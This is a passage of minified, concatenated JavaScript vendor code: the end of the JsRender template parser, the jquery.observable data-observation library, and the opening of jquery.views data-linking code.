if(full.length-2>index-expr){expr=full.slice(expr,index+1);rtPrnDot=delimOpenChar1+":"+expr+delimCloseChar0;rtPrnDot=tmplLinks[rtPrnDot]=tmplLinks[rtPrnDot]||tmplFn(delimOpenChar0+rtPrnDot+delimCloseChar1,tmpl,true);if(!rtPrnDot.paths){parseParams(expr,rtPrnDot.paths=[],tmpl);}
bindings.push({_jsvOb:rtPrnDot});}}
return(aposed?(aposed=!apos,(aposed?all:'"')):quoted?(quoted=!quot,(quoted?all:'"')):((lftPrn?(parenDepth++,pathStart[parenDepth]=index++,lftPrn):"")
+(space?(parenDepth?"":named?(named=isAlias=false,"\b"):","):eq?(parenDepth&&syntaxError(params),named=path,isAlias=path.charAt(0)==="~",'\b'+path+':'):path?(path.split("^").join(".").replace(rPath,parsePath)
+(prn?(fnCall[++parenDepth]=true,path.charAt(0)!=="."&&(pathStart[parenDepth]=index),prn):operator)):operator?operator:rtPrn?((fnCall[parenDepth--]=false,rtPrn)
+(prn?(fnCall[++parenDepth]=true,prn):"")):comma?(fnCall[parenDepth]||syntaxError(params),","):lftPrn0?"":(aposed=apos,quoted=quot,'"'))));}}
var named,isAlias,tmplLinks=tmpl.links,fnCall={},pathStart={0:-1},parenDepth=0,quoted=false,aposed=false;return(params+" ").replace(rParams,parseTokens);}
function extendCtx(context,parentContext){return context&&context!==parentContext?(parentContext?$extend($extend({},parentContext),context):context):parentContext&&$extend({},parentContext);}
for(jsvStoreName in jsvStores){registerStore(jsvStoreName,jsvStores[jsvStoreName]);}
var $templates=$views.templates,$converters=$views.converters,$helpers=$views.helpers,$tags=$views.tags,$viewsSub=$views.sub,$viewsSettings=$views.settings;if(jQuery){$=jQuery;$.fn.render=renderContent;}else{$=global.jsviews={};$.isArray=Array&&Array.isArray||function(obj){return Object.prototype.toString.call(obj)==="[object Array]";};}
$.render=$render;$.views=$views;$.templates=$templates=$views.templates;$tags({"else":function(){},"if":{render:function(val){var self=this,ret=(self.rendering.done||!val&&(arguments.length||!self.tagCtx.index))?"":(self.rendering.done=true,self.selected=self.tagCtx.index,self.tagCtx.render());return ret;},onUpdate:function(ev,eventArgs,tagCtxs){var tci,prevArg,different;for(tci=0;(prevArg=this.tagCtxs[tci])&&prevArg.args.length;tci++){prevArg=prevArg.args[0];different=!prevArg!==!tagCtxs[tci].args[0];if(!!prevArg||different){return different;}}
return false;},flow:true},"for":{render:function(val){var i,arg,self=this,tagCtx=self.tagCtx,noArg=!arguments.length,result="",done=noArg||0;if(!self.rendering.done){if(noArg){result=undefined;}else if(val!==undefined){result+=tagCtx.render(val);done+=$.isArray(val)?val.length:1;}
if(self.rendering.done=done){self.selected=tagCtx.index;}}
return result;},onUpdate:function(ev,eventArgs,tagCtxs){},onArrayChange:function(ev,eventArgs){var arrayView,self=this,change=eventArgs.change;if(this.tagCtxs[1]&&(change==="insert"&&ev.target.length===eventArgs.items.length||change==="remove"&&!ev.target.length||change==="refresh"&&!eventArgs.oldItems.length!==!ev.target.length)){this.refresh();}else{for(arrayView in self._.arrVws){arrayView=self._.arrVws[arrayView];if(arrayView.data===ev.target){arrayView._.onArrayChange.apply(arrayView,arguments);}}}
ev.done=true;},flow:true},include:{flow:true},"*":{render:function(value){return value;},flow:true}});function getCharEntity(ch){return charEntities[ch];}
$converters({html:function(text){return text!=undefined?String(text).replace(rHtmlEncode,getCharEntity):"";},attr:function(text){return text!=undefined?String(text).replace(rAttrEncode,getCharEntity):text===null?null:"";},url:function(text){return text!=undefined?encodeURI(String(text)):text===null?null:"";}});$viewsDelimiters();})(this,this.jQuery);
// js/vendor/jquery.observable.js

(function(global,$,undefined){"use strict";if(!$){throw"requires jQuery or JsRender";}
if($.observable){return;}
var versionNumber="v1.0pre",cbBindings,cbBindingsId,oldLength,_data,$eventSpecial=$.event.special,$viewsSub=$.views?$.views.sub:{},cbBindingKey=1,splice=[].splice,concat=[].concat,$isArray=$.isArray,$expando=$.expando,OBJECT="object",propertyChangeStr=$viewsSub.propChng=$viewsSub.propChng||"propertyChange",arrayChangeStr=$viewsSub.arrChng=$viewsSub.arrChng||"arrayChange",cbBindingsStore=$viewsSub._cbBnds=$viewsSub._cbBnds||{},observeStr=propertyChangeStr+".observe",$isFunction=$.isFunction,observeObjKey=1,observeCbKey=1,$hasData=$.hasData;function $observable(data){return $isArray(data)?new ArrayObservable(data):new ObjectObservable(data);}
function ObjectObservable(data){this._data=data;return this;}
function ArrayObservable(data){this._data=data;return this;}
function wrapArray(data){return $isArray(data)?[data]:data;}
function validateIndex(index){if(typeof index!=="number"){throw"Invalid index.";}}
function resolvePathObjects(paths,root){paths=$isArray(paths)?paths:[paths];var i,path,object=root,nextObj=object,l=paths.length,out=[];for(i=0;i<l;i++){path=paths[i];if($isFunction(path)){splice.apply(out,[out.length,1].concat(resolvePathObjects(path.call(root,root),root)));continue;}else if(""+path!==path){root=nextObj=path;if(nextObj!==object){out.push(object=nextObj);}
continue;}
if(nextObj!==object){out.push(object=nextObj);}
out.push(path);}
return out;}
function removeCbBindings(cbBindings,cbBindingsId){var cb,found;for(cb in cbBindings){found=true;break;}
if(!found){delete cbBindingsStore[cbBindingsId];}}
function onObservableChange(ev,eventArgs){if(!(ev.data&&ev.data.off)){var value=eventArgs.oldValue,ctx=ev.data;if(ev.type===arrayChangeStr){ctx.cb.array(ev,eventArgs);}else if(ctx.prop==="*"||ctx.prop===eventArgs.path){if(typeof value===OBJECT){$unobserve(wrapArray(value),ctx.path,ctx.cb);}
if(typeof(value=eventArgs.value)===OBJECT){$observe(wrapArray(value),ctx.path,ctx.cb);}
ctx.cb(ev,eventArgs);}}}
function $observe(){function observeOnOff(namespace,pathStr,isArrayBinding,off){var obIdExpando=$hasData(object),boundObOrArr=wrapArray(object);cbBindings=0;if(unobserve||off){if(obIdExpando){$(boundObOrArr).off(namespace,onObservableChange);if(cbBindings){delete cbBindings[$.data(object,"obId")];}}}else{if(events=obIdExpando&&$._data(object)){events=events&&events.events;events=events&&events[isArrayBinding?arrayChangeStr:propertyChangeStr];el=events&&events.length;while(el--){if((data=events[el].data)&&data.cb===callback){if(isArrayBinding){return;}else if(pathStr==="*"&&data.prop!==pathStr){$(object).off(namespace+"."+data.prop,onObservableChange);if(cbBindings){delete cbBindings[$.data(object,"obId")];}}}}}
$(boundObOrArr).on(namespace,null,isArrayBinding?{cb:callback}:{path:pathStr,prop:prop,cb:callback},onObservableChange);if(bindings){bindings[$.data(object,"obId")||$.data(object,"obId",observeObjKey++)]=object;}}}
function onUpdatedExpression(exprOb,paths,unobserve){exprOb._ob=contextCb(exprOb,origRoot);var origRt=origRoot;return function(){var obj=exprOb._ob,len=paths.length;if(typeof obj===OBJECT){bindArray(obj,true);if(len){$unobserve(wrapArray(obj),paths,callback,contextCb,origRt);}}
obj=exprOb._ob=contextCb(exprOb,origRt);if(typeof obj===OBJECT){bindArray(obj);if(len){$observe(wrapArray(obj),paths,callback,contextCb,origRt);}}}}
function bindArray(arr,unbind){if(callback&&callback.array&&$isArray(arr)){var prevObj=object;object=arr;observeOnOff(arrayChangeStr+".observe.obs"+callback._bnd,undefined,true,unbind);object=prevObj;}}
var i,parts,prop,path,dep,object,unobserve,callback,cbId,el,data,events,contextCb,items,bindings,depth,innerCb,topLevel=1,ns=observeStr,paths=concat.apply([],arguments),lastArg=paths.pop(),origRoot=paths[0],root=""+origRoot!==origRoot?paths.shift():undefined,l=paths.length;origRoot=root;if($isFunction(lastArg)){callback=lastArg;}else{if(lastArg===true){unobserve=lastArg;}else if(lastArg){origRoot=lastArg;topLevel=0;}
lastArg=paths[l-1];if(l&&lastArg===undefined||$isFunction(lastArg)){callback=paths.pop();l--;}}
if($isFunction(paths[l-1])){contextCb=callback;callback=paths.pop();l--;}
ns+=unobserve?(callback?".obs"+callback._bnd:""):".obs"+(cbId=callback._bnd=callback._bnd||observeCbKey++);if(unobserve&&l===0&&root){$(root).off(observeStr,onObservableChange);}
if(!unobserve){bindings=cbBindingsStore[cbId]=cbBindingsStore[cbId]||{};}
depth=0;for(i=0;i<l;i++){path=paths[i];bindArray(object,unobserve);object=root;if(""+path===path){parts=path.split("^");if(parts[1]){depth=parts[0].split(".").length;path=parts.join(".");depth=path.split(".").length-depth;}
if(contextCb&&(items=contextCb(path,root))){l+=items.length-1;splice.apply(paths,[i--,1].concat(items));continue;}
parts=path.split(".");}else{if(topLevel&&!$isFunction(path)){if(path._jsvOb){if(!unobserve){path._cb=innerCb=onUpdatedExpression(path,paths.slice(i+1));path._rt=origRoot;innerCb._bnd=callback._bnd;}
$observe(path._rt,paths.slice(0,i),path._cb,contextCb,unobserve);path=path._ob;}
object=path;}
root=path;parts=[root];}
while(object&&typeof object==="object"&&(prop=parts.shift())!==undefined){if(""+prop===prop){if(prop===""){continue;}
if((parts.length<depth+1)&&!object.nodeType){if(!unobserve&&(events=$hasData(object)&&$._data(object))){events=events.events;events=events&&events.propertyChange;el=events&&events.length;while(el--){data=events[el].data;if(data&&data.cb===callback&&((data.prop===prop&&data.path===parts.join("."))||data.prop==="*")){break;}}
if(el>-1){object=object[prop];continue;}}
if(prop==="*"){if($isFunction(object)){if(dep=object.depends){$observe(dep,callback,unobserve||origRoot);}}else{observeOnOff(ns,prop);}
break;}else if(prop&&!($isFunction(dep=object[prop])&&dep.depends)){observeOnOff(ns+"."+prop,parts.join("."));}}
prop=prop?object[prop]:object;}
if($isFunction(prop)){if(dep=prop.depends){$observe(object,resolvePathObjects(dep,object),callback,contextCb,unobserve||wrapArray(origRoot));}
break;}
object=prop;}}
bindArray(object,unobserve);if(cbId){removeCbBindings(bindings,cbId);}
return{cbId:cbId,bnd:bindings,leaf:object};}
function $unobserve(){[].push.call(arguments,true);return $observe.apply(this,arguments);}
$.observable=$observable;$observable.Object=ObjectObservable;$observable.Array=ArrayObservable;$observable.observe=$observe;$observable.unobserve=$unobserve;ObjectObservable.prototype={_data:null,data:function(){return this._data;},observe:function(paths,callback){return $observe(this._data,paths,callback);},unobserve:function(paths,callback){return $unobserve(this._data,paths,callback);},setProperty:function(path,value,nonStrict){var leaf,key,pair,parts,self=this,object=self._data;path=path||"";if(object){if($isArray(path)){key=path.length;while(key--){pair=path[key];self.setProperty(pair.name,pair.value,nonStrict===undefined||nonStrict)}}else if(""+path!==path){for(key in path){self.setProperty(key,path[key],value);}}else if(path.indexOf($expando)<0){parts=path.split(".");while(object&&parts.length>1){object=object[parts.shift()];}
self._setProperty(object,parts.join("."),value,nonStrict);}}
return self;},_setProperty:function(leaf,path,value,nonStrict){var setter,getter,property=path?leaf[path]:leaf;if($isFunction(property)){if(property.set){getter=property;setter=property.set===true?property:property.set;property=property.call(leaf);}}
if(property!==value||nonStrict&&property!=value){if(!(property instanceof Date)||property>value||property<value){if(setter){setter.call(leaf,value);value=getter.call(leaf);}else{leaf[path]=value;}
this._trigger(leaf,{path:path,value:value,oldValue:property});}}},_trigger:function(target,eventArgs){$(target).triggerHandler(propertyChangeStr,eventArgs);}};ArrayObservable.prototype={_data:null,data:function(){return this._data;},insert:function(index,data){validateIndex(index);if(arguments.length>1){data=$isArray(data)?data:[data];if(data.length){this._insert(index,data);}}
return this;},_insert:function(index,data){_data=this._data;oldLength=_data.length;splice.apply(_data,[index,0].concat(data));this._trigger({change:"insert",index:index,items:data});},remove:function(index,numToRemove){validateIndex(index);numToRemove=(numToRemove===undefined||numToRemove===null)?1:numToRemove;if(numToRemove&&index>-1){var items=this._data.slice(index,index+numToRemove);numToRemove=items.length;if(numToRemove){this._remove(index,numToRemove,items);}}
return this;},_remove:function(index,numToRemove,items){_data=this._data;oldLength=_data.length;_data.splice(index,numToRemove);this._trigger({change:"remove",index:index,items:items});},move:function(oldIndex,newIndex,numToMove){validateIndex(oldIndex);validateIndex(newIndex);numToMove=(numToMove===undefined||numToMove===null)?1:numToMove;if(numToMove){var items=this._data.slice(oldIndex,oldIndex+numToMove);this._move(oldIndex,newIndex,numToMove,items);}
return this;},_move:function(oldIndex,newIndex,numToMove,items){_data=this._data;oldLength=_data.length;_data.splice(oldIndex,numToMove);_data.splice.apply(_data,[newIndex,0].concat(items));this._trigger({change:"move",oldIndex:oldIndex,index:newIndex,items:items});},refresh:function(newItems){var oldItems=this._data.slice(0);this._refresh(oldItems,newItems);return this;},_refresh:function(oldItems,newItems){_data=this._data;oldLength=_data.length;splice.apply(_data,[0,_data.length].concat(newItems));this._trigger({change:"refresh",oldItems:oldItems});},_trigger:function(eventArgs){var $data=$([_data]);$data.triggerHandler(arrayChangeStr,eventArgs);$data.triggerHandler(propertyChangeStr,{path:"length",value:_data.length,oldValue:oldLength});}};$eventSpecial[propertyChangeStr]=$eventSpecial[arrayChangeStr]={remove:function(evData){if((evData=evData.data)&&(evData.off=1,evData=evData.cb)){cbBindings=cbBindingsStore[cbBindingsId=evData._bnd];}},teardown:function(namespaces){if(cbBindings){delete cbBindings[$.data(this,"obId")];removeCbBindings(cbBindings,cbBindingsId);}}};})(this,this.jQuery||this.jsviews);
// js/vendor/jquery.views.js

(function(global,$,undefined){"use strict";if(!$){throw"requires jQuery";}
if(!$.views){throw"requires JsRender";}
if(!$.observable){throw"requires jquery.observable";}
if($.link){return;}
var versionNumber="v1.0pre",LinkedView,activeBody,$view,rTag,delimOpenChar0,delimOpenChar1,delimCloseChar0,delimCloseChar1,linkChar,validate,document=global.document,$views=$.views,$viewsSub=$views.sub,$viewsSettings=$views.settings,$extend=$viewsSub.extend,topView=$viewsSub.View(undefined,"top"),$isFunction=$.isFunction,$templates=$views.templates,$observable=$.observable,$observe=$observable.observe,jsvAttrStr="data-jsv",$viewsLinkAttr=$viewsSettings.linkAttr||"data-link",propertyChangeStr=$viewsSettings.propChng=$viewsSettings.propChng||"propertyChange",arrayChangeStr=$viewsSub.arrChng=$viewsSub.arrChng||"arrayChange",cbBindingsStore=$viewsSub._cbBnds=$viewsSub._cbBnds||{},elementChangeStr="change.jsv",onBeforeChangeStr="onBeforeChange",onAfterChangeStr="onAfterChange",onAfterCreateStr="onAfterCreate",closeScript='"></script>',openScript='<script type="jsv',bindElsSel="script,["+jsvAttrStr+"]",linkViewsSel=bindElsSel+",["+$viewsLinkAttr+"]",fnSetters={value:"val",input:"val",html:"html",text:"text"},valueBinding={from:{fromAttr:"value"},to:{toAttr:"value"}},oldCleanData=$.cleanData,oldJsvDelimiters=$viewsSettings.delimiters,error=$viewsSub.error,syntaxError=$viewsSub.syntaxError,rFirstElem=/<(?!script)(\w+)[>\s]/,safeFragment=document.createDocumentFragment(),qsa=document.querySelector,elContent={ol:1,ul:1,table:1,tbody:1,thead:1,tfoot:1,tr:1,colgroup:1,dl:1,select:1,optgroup:1},badParent={tr:"table"},wrapMap=$viewsSettings.wrapMap={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],svg:[1,"<svg>","</svg>"],div:[1,"x<div>","</div>"]},voidElems={br:1,img:1,input:1,hr:1,area:1,base:1,col:1,link:1,meta:1,command:1,embed:1,keygen:1,param:1,source:1,track:1,wbr:1},displayStyles={},viewStore={0:topView},bindingStore={},bindingKey=1,rViewPath=/^#(view\.?)?/,rConvertMarkers=/(^|(\/>)|(<\/\w+>)|>|)(\s*)([#\/]\d+[_^])`(\s*)(<\w+(?=[\s\/>]))?|\s*(?:(<\w+(?=[\s\/>]))|(<\/\w+>)(\s*)|(\/>)\s*)/g,rOpenViewMarkers=/(#)()(\d+)(_)/g,rOpenMarkers=/(#)()(\d+)([_^])/g,rViewMarkers=/(?:(#)|(\/))(\d+)(_)/g,rOpenTagMarkers=/(#)()(\d+)(\^)/g,rMarkerTokens=/(?:(#)|(\/))(\d+)([_^])([-+@\d]+)?/g;wrapMap.optgroup=wrapMap.option;wrapMap.tbody=wrapMap.tfoot=wrapMap.colgroup=wrapMap.caption=wrapMap.thead;wrapMap.th=wrapMap.td;function elemChangeHandler(ev){var setter,cancel,fromAttr,linkCtx,sourceValue,cvtBack,cnvtName,target,$source,view,binding,bindings,l,source=ev.target,onBeforeChange,onAfterChange,to=source._jsvBnd;if(to){bindings=to.slice(1).split("&");l=bindings.length;while(l--){if(binding=bindingStore[bindings[l]]){linkCtx=binding.linkCtx;view=linkCtx.view;if(to=binding.to){$source=$(source);onBeforeChange=view.hlp(onBeforeChangeStr);onAfterChange=view.hlp(onAfterChangeStr);fromAttr=defaultAttr(source);setter=fnSetters[fromAttr];sourceValue=$isFunction(fromAttr)?fromAttr(source):setter?$source[setter]():$source.attr(fromAttr);if((!onBeforeChange||!(cancel=onBeforeChange.call(view,ev)===false))&&sourceValue!==undefined){cnvtName=to[1];to=to[0];target=to[0];target=target._jsvOb?target._ob:target;to=to[2]||to[1];if($isFunction(cnvtName)){cvtBack=cnvtName;}else{cvtBack=view.tmpl.converters;cvtBack=cvtBack&&cvtBack[cnvtName]||$views.converters[cnvtName];}
if(cvtBack){sourceValue=cvtBack.call(linkCtx.tag,sourceValue);}
if(sourceValue!==undefined&&target){$observable(target).setProperty(to,sourceValue);if(onAfterChange){onAfterChange.call(linkCtx,ev);}}}
if(cancel){ev.stopImmediatePropagation();}}}}}}
function propertyChangeHandler(ev,eventArgs,linkFn){var attr,setter,changed,sourceValue,css,tag,ctx,prevNode,nextNode,oldLinkCtx,cancel,inlineTag,elCnt,nodesToRemove,linkCtx=this,source=linkCtx.data,target=linkCtx.elem,cvt=linkCtx.cvt,attrOrProp="attr",parentElem=target.parentNode,targetElem=parentElem,$target=$(target),view=linkCtx.view,onEvent=view.hlp(onBeforeChangeStr);if(parentElem&&(!onEvent||!(eventArgs&&onEvent.call(linkCtx,ev,eventArgs)===false))&&!(eventArgs&&ev.data.prop!=="*"&&ev.data.prop!==eventArgs.path)){oldLinkCtx=view.linkCtx;view.linkCtx=linkCtx;if(eventArgs){linkCtx.eventArgs=eventArgs;}
if(!ev||eventArgs||linkCtx._initVal){delete linkCtx._initVal;sourceValue=linkFn.call(view.tmpl,source,view,$views);attr=linkCtx.attr||defaultAttr(target,true,cvt!==undefined);if(tag=linkCtx.tag){if(eventArgs&&tag.onUpdate&&tag.onUpdate(ev,eventArgs,sourceValue)===false||attr==="none"){observeAndBind(linkCtx,source,target,linkFn);view.linkCtx=oldLinkCtx;return;}
sourceValue=tag.tagName.slice(-1)===":"?$views._cnvt(tag.tagName.slice(0,-1),view,sourceValue):$views._tag(tag.tagName,view,view.tmpl,sourceValue);}else if(linkFn._ctxs){cvt=cvt===""?"true":cvt;sourceValue=cvt?$views._cnvt(cvt,view,sourceValue):$views._tag(linkFn._ctxs,view,view.tmpl,sourceValue);tag=view._.tag;attr=linkCtx.attr||attr;}
if(tag){tag.parentElem=(linkCtx.expr||tag._elCnt)?target:target.parentNode;prevNode=tag._prv;nextNode=tag._nxt;tag.refresh=refreshTag;}
if($isFunction(sourceValue)){error(linkCtx.expr+": missing parens");}
if(attr==="visible"){attr="css-display";sourceValue=sourceValue?getElementDefaultDisplay(target):"none";}
if(css=attr.lastIndexOf("css-",0)===0&&attr.substr(4)){if(changed=$.style(target,css)!==sourceValue){$.style(target,css,sourceValue);}}else if(attr!=="link"){if(attr==="value"){if(target.type==="checkbox"){sourceValue=sourceValue&&sourceValue!=="false";attrOrProp="prop";attr="checked";}}else if(attr==="radio"){if(target.value===(""+sourceValue)){sourceValue=true;attrOrProp="prop";attr="checked";}else{observeAndBind(linkCtx,source,target,linkFn);view.linkCtx=oldLinkCtx;return;}}
setter=fnSetters[attr];if(setter){if(changed=tag||$target[setter]()!==sourceValue){if(attr==="html"){if(tag){inlineTag=tag._.inline;tag.refresh(sourceValue);if(!inlineTag&&tag._.inline){view.linkCtx=oldLinkCtx;return;}}else{$target.empty();targetElem=target;view.link(source,targetElem,prevNode,nextNode,sourceValue,tag&&{tag:tag._tgId});}}else if(attr==="text"&&!target.children[0]){if(target.textContent!==undefined){target.textContent=sourceValue;}else{target.innerText=sourceValue===null?"":sourceValue;}}else{$target[setter](sourceValue);}}}else if(changed=$target[attrOrProp](attr)!=sourceValue){$target[attrOrProp](attr,sourceValue===undefined&&attrOrProp==="attr"?null:sourceValue);}}
if(eventArgs&&changed&&(onEvent=view.hlp(onAfterChangeStr))){onEvent.call(linkCtx,ev,eventArgs);}}
observeAndBind(linkCtx,source,target,linkFn);view.linkCtx=oldLinkCtx;}}
function arrayChangeHandler(ev,eventArgs){var self=this,onBeforeChange=self.hlp(onBeforeChangeStr),onAfterChange=self.hlp(onAfterChangeStr);if(!onBeforeChange||onBeforeChange.call(ev,eventArgs)!==false){if(eventArgs){var action=eventArgs.change,index=eventArgs.index,items=eventArgs.items;switch(action){case"insert":self.addViews(index,items);break;case"remove":self.removeViews(index,items.length);break;case"move":self.refresh();break;case"refresh":self.refresh();break;}}
if(onAfterChange){onAfterChange.call(this,ev,eventArgs);}}}
function getElementDefaultDisplay(elem){var testElem,nodeName,getComputedStyle=global.getComputedStyle,cStyle=(elem.currentStyle||getComputedStyle.call(global,elem,"")).display;if(cStyle==="none"&&!(cStyle=displayStyles[nodeName=elem.nodeName])){testElem=document.createElement(nodeName);document.body.appendChild(testElem);cStyle=(getComputedStyle?getComputedStyle.call(global,testElem,""):testElem.currentStyle).display;displayStyles[nodeName]=cStyle;document.body.removeChild(testElem);}
return cStyle;}
function setArrayChangeLink(view){var handler,arrayBinding,data=view.data,bound=view._.bnd;if(!view._.useKey&&bound){if(arrayBinding=view._.bndArr){$([arrayBinding[1]]).off(arrayChangeStr,arrayBinding[0]);view._.bndArr=undefined;}
if(bound!==!!bound&&!bound.linkCtx){if(data){bound._.arrVws[view._.id]=view;}else{delete bound._.arrVws[view._.id];}}else if(data){handler=function(ev){if(!(ev.data&&ev.data.off)){arrayChangeHandler.apply(view,arguments);}};$([data]).on(arrayChangeStr,handler);view._.bndArr=[handler,data];}}}
function defaultAttr(elem,to,linkGetVal){var nodeName=elem.nodeName.toLowerCase(),attr=$viewsSettings.merge[nodeName];return attr?(to?((nodeName==="input"&&elem.type==="radio")?"radio":attr.to.toAttr):attr.from.fromAttr):to?linkGetVal?"text":"html":"";}
function renderAndLink(view,index,tmpl,views,data,context,refresh){var html,linkToNode,prevView,tag,nodesToRemove,bindId,parentNode=view.parentElem,prevNode=view._prv,nextNode=view._nxt,elCnt=view._elCnt;if(prevNode&&prevNode.parentNode!==parentNode){error("Missing parentNode");}
if(refresh){nodesToRemove=view.nodes();if(elCnt&&prevNode&&prevNode!==nextNode){transferViewTokens(prevNode,nextNode,parentNode,view._.id,"_",true);}
view.removeViews(undefined,undefined,true);linkToNode=nextNode;if(elCnt){prevNode=prevNode?prevNode.previousSibling:nextNode?nextNode.previousSibling:parentNode.lastChild;}
$(nodesToRemove).remove();for(bindId in view._.bnds){removeViewBinding(bindId,true);}}else{if(index){prevView=views[index-1];if(!prevView){return false;}
prevNode=prevView._nxt;}
if(elCnt){linkToNode=prevNode;prevNode=linkToNode?linkToNode.previousSibling:parentNode.lastChild;}else{linkToNode=prevNode.nextSibling;}}
html=tmpl.render(data,context,view,refresh||index,view._.useKey&&refresh,true);view.link(data,parentNode,prevNode,linkToNode,html,prevView);}
function addBindingMarkers(value,view,tmplBindingKey){var id,tag,end;if(tmplBindingKey){end="^`";tag=view._.tag||{_:{inline:true,bnd:tmplBindingKey},tagCtx:{view:view},flow:true};id=tag._tgId;tag.refresh=refreshTag;if(!id){bindingStore[id=bindingKey++]=tag;tag._tgId=""+id;}}else{end="_`";viewStore[id=view._.id]=view;}
return"#"+id+end
+(value===undefined?"":value)
+"/"+id+end;}
function observeAndBind(linkCtx,source,target,linkFn){var tag,binding,cvtBack,paths,lastPath,pathIndex,depends=[],bindId=linkCtx._bndId||""+bindingKey++,handler=linkCtx._hdlr;delete linkCtx._bndId;if(tag=linkCtx.tag){depends=tag.depends||depends;depends=$isFunction(depends)?tag.depends(tag):depends;cvtBack=tag.onChange;}
cvtBack=cvtBack||linkCtx._cvtBk;if(!linkCtx._depends||(""+linkCtx._depends!==""+depends)){if(linkCtx._depends){$observe(source,linkCtx._depends,handler,true);}
binding=$observe($.isArray(source)?[source]:source,paths=linkCtx.fn.paths||linkCtx.fn,depends,handler,linkCtx._ctxCb);binding.elem=target;binding.linkCtx=linkCtx;binding._tgId=bindId;target._jsvBnd=target._jsvBnd||"";target._jsvBnd+="&"+bindId;linkCtx._depends=depends;linkCtx.view._.bnds[bindId]=bindId;bindingStore[bindId]=binding;if(cvtBack!==undefined){pathIndex=paths.length;while(""+(lastPath=paths[--pathIndex])!==lastPath){};lastPath=paths[pathIndex]=lastPath.split("^").join(".");binding.to=lastPath.charAt(0)==="."?[[paths[pathIndex-1],lastPath.slice(1)],cvtBack]:[linkCtx._ctxCb(paths[0])||[source,paths[0]],cvtBack];}}}
function tmplLink(to,from,context,parentView,prevNode,nextNode){return $link(this,to,from,context,parentView,prevNode,nextNode);}
function $link(tmplOrLinkTag,to,from,context,parentView,prevNode,nextNode){if(tmplOrLinkTag&&to){to=to.jquery?to:$(to);if(!activeBody){activeBody=document.body;$(activeBody).on(elementChangeStr,elemChangeHandler);}
var i,k,html,vwInfos,view,placeholderParent,targetEl,onRender=addBindingMarkers,replaceMode=context&&context.target==="replace",l=to.length;while(l--){targetEl=to[l];if(""+tmplOrLinkTag===tmplOrLinkTag){addDataBinding(tmplOrLinkTag,targetEl,$view(targetEl),from,context);}else{parentView=parentView||$view(targetEl);if(tmplOrLinkTag.markup!==undefined){if(parentView.link===false){context=context||{};context.link=onRender=false;}
if(replaceMode){placeholderParent=targetEl.parentNode;}
html=tmplOrLinkTag.render(from,context,parentView,undefined,undefined,onRender);if(placeholderParent){prevNode=targetEl.previousSibling;nextNode=targetEl.nextSibling;$.cleanData([targetEl],true);placeholderParent.removeChild(targetEl);targetEl=placeholderParent;}else{prevNode=nextNode=undefined;$(targetEl).empty();}}else if(tmplOrLinkTag!==true){break;}
if(targetEl._dfr&&!nextNode){vwInfos=viewInfos(targetEl._dfr,true,rOpenViewMarkers);for(i=0,k=vwInfos.length;i<k;i++){view=vwInfos[i];if((view=viewStore[view.id])&&view.data!==undefined){view.parent.removeViews(view._.key,undefined,true);}}
targetEl._dfr="";}
parentView.link(from,targetEl,prevNode,nextNode,html);}}}
return to;}
function viewLink(outerData,parentNode,prevNode,nextNode,html,refresh){function convertMarkers(all,preceding,selfClose,closeTag,spaceBefore,id,spaceAfter,tag1,tag2,closeTag2,spaceAfterClose,selfClose2){var endOfElCnt="";tag=tag1||tag2||"";closeTag=closeTag||selfClose||closeTag2||selfClose2;if(closeTag){if(validate&&(selfClose||selfClose2)&&!voidElems[parentTag]){syntaxError("'<"+parentTag+"... />' in:\n"+html);}
prevElCnt=elCnt;parentTag=tagStack.shift();elCnt=elContent[parentTag];if(prevElCnt){defer+=ids;ids="";if(!elCnt){endOfElCnt=(closeTag2||"")+openScript+"@"+defer+closeScript+(spaceAfterClose||"");defer=deferStack.shift();}else{defer+="-";}}}
if(elCnt){if(id){ids+=id;}else{preceding=(closeTag2||selfClose2||"");}
if(tag){preceding+=tag;if(ids){preceding+=' '+jsvAttrStr+'="'+ids+'"';ids="";}}}else{preceding=id?(preceding+endOfElCnt+spaceBefore+openScript+id+closeScript+spaceAfter+tag):endOfElCnt||all;}
if(tag){tagStack.unshift(parentTag);parentTag=tag.slice(1);if(tagStack[0]===badParent[parentTag]){error('"'+parentTag+'" has incorrect parent tag');}
if((elCnt=elContent[parentTag])&&!prevElCnt){deferStack.unshift(defer);defer="";}
prevElCnt=elCnt;if(defer&&elCnt){defer+="+";}}
return preceding;}
function processViewInfos(vwInfos,targetParent){var deferPath,deferChar,bindChar,parentElem,id,onAftCr,deep,addedBindEls=[];if(vwInfos){len=vwInfos.length;if(vwInfos.tokens.charAt(0)==="@"){targetParent=elem.previousSibling;elem.parentNode.removeChild(elem);elem=null;}
len=vwInfos.length;while(len--){vwInfo=vwInfos[len];bindChar=vwInfo.ch;if(deferPath=vwInfo.path){j=deferPath.length-1;while(deferChar=deferPath.charAt(j--)){if(deferChar==="+"){if(deferPath.charAt(j)==="-"){j--;targetParent=targetParent.previousSibling;}else{targetParent=targetParent.parentNode;}}else{targetParent=targetParent.lastChild;}}}
if(bindChar==="^"){if(tag=bindingStore[id=vwInfo.id]){deep=targetParent&&(!elem||elem.parentNode!==targetParent);if(!elem||deep){tag.parentElem=targetParent;}
if(vwInfo.elCnt){if(vwInfo.open){if(targetParent){targetParent._dfr="#"+id+bindChar+(targetParent._dfr||"");}}else if(deep){targetParent._dfr="/"+id+bindChar+(targetParent._dfr||"");}}
addedBindEls.push([deep?null:elem,vwInfo]);}}else if(view=viewStore[id=vwInfo.id]){if(!view.link){view.parentElem=targetParent||elem&&elem.parentNode||parentNode;$extend(view,LinkedView);view._.onRender=addBindingMarkers;view._.onArrayChange=arrayChangeHandler;setArrayChangeLink(view);}
parentElem=view.parentElem;if(vwInfo.open){view._elCnt=vwInfo.elCnt;if(targetParent){targetParent._dfr="#"+id+bindChar+(targetParent._dfr||"");}else{if(!view._prv){parentElem._dfr=removeSubStr(parentElem._dfr,"#"+id+bindChar);}
view._prv=elem;}}else{if(targetParent&&(!elem||elem.parentNode!==targetParent)){targetParent._dfr="/"+id+bindChar+(targetParent._dfr||"");view._nxt=undefined;}else if(elem){if(!view._nxt){parentElem._dfr=removeSubStr(parentElem._dfr,"/"+id+bindChar);}
view._nxt=elem;}
linkCtx=view.linkCtx;if(onAftCr=onAfterCreate||(view.ctx&&view.ctx.onAfterCreate)){onAftCr.call(linkCtx,view);}}}}
